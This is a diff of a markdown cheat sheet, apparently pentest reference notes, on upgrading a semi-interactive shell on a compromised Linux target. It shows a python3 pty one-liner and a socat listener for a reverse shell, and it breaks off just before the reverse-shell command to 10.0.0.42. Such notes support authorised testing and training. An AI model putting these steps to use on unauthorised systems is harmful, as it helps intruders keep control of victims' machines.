@@ -4,16 +4,18 @@ Upgrade a semi-interactive shell to a fully interactive shell.
 
 ## Linux
 
-Method 1 - Using python3's pty module:
+### Method 1 - Using python3's pty module:
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-Method 2 - Create a new reverse shell with socat:
+You can also create a binary version of this short script using [PyInstaller](https://www.pyinstaller.org/). That way python will not need to be installed on the target machine, but you will have to create different binaries for different architectures.
+
+### Method 2 - Create a new reverse shell with socat:
 
 Listen for the shell on your own machine:
 ```bash
-socat file:`tty`,raw,echo=0 tcp-listen:5555
+socat file:`tty`,raw,echo=0 tcp-listen:5555,reuseaddr
 ```
 
 Transfer the socat binary to the target and send a reverse shell to your machine (10.0.0.42):
